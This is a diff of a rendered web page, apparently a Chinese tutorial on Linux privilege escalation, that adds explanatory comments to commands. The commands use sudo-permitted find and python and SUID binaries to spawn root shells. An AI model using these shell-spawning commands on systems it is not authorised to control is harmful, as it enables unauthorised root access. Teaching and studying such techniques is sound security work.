@@ -39,20 +39,28 @@
 </span><span class=lnt>4
 </span><span class=lnt>5
 </span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span><span class=lnt>9
 </span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># 如果 sudo -l 显示可以无密码执行 find/vim/python 等</span>
 </span></span><span class=line><span class=cl>sudo -l
+</span></span><span class=line><span class=cl><span class=c1># 解释：列出当前用户可执行的 sudo 命令，提权的关键入口</span>
 </span></span><span class=line><span class=cl><span class=c1># 例：sudo find 提权</span>
 </span></span><span class=line><span class=cl>sudo find / -exec /bin/sh <span class=se>\;</span>
+</span></span><span class=line><span class=cl><span class=c1># 解释：find 有 -exec 可执行命令，/bin/sh 提权；注意 -p 保留 SUID 权限</span>
 </span></span><span class=line><span class=cl><span class=c1># 例：sudo python 提权</span>
 </span></span><span class=line><span class=cl>sudo python -c <span class=s1>&#39;import os; os.system(&#34;/bin/bash&#34;)&#39;</span>
+</span></span><span class=line><span class=cl><span class=c1># 解释：sudo 下 python 直接调系统命令弹 shell</span>
 </span></span></code></pre></td></tr></table></div></div><p>规则：<code>sudo -l</code> 里能执行什么，就去 GTFOBins 查对应的提权命令。</p><h3 id=第三步suid-提权>第三步：SUID 提权</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
 </span><span class=lnt>2
 </span><span class=lnt>3
 </span><span class=lnt>4
 </span><span class=lnt>5
 </span><span class=lnt>6
+</span><span class=lnt>7
 </span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># 找所有 SUID 文件</span>
 </span></span><span class=line><span class=cl>find / -perm -4000 -type f 2&gt;/dev/null
+</span></span><span class=line><span class=cl><span class=c1># 解释：-4000 匹配 SUID 位，SUID 程序以文件所有者（常为 root）权限运行</span>
 </span></span><span class=line><span class=cl><span class=c1># 例：find SUID</span>
 </span></span><span class=line><span class=cl>find / -exec /bin/sh -p <span class=se>\;</span>
 </span></span><span class=line><span class=cl><span class=c1># 例：nmap 旧版本交互模式</span>
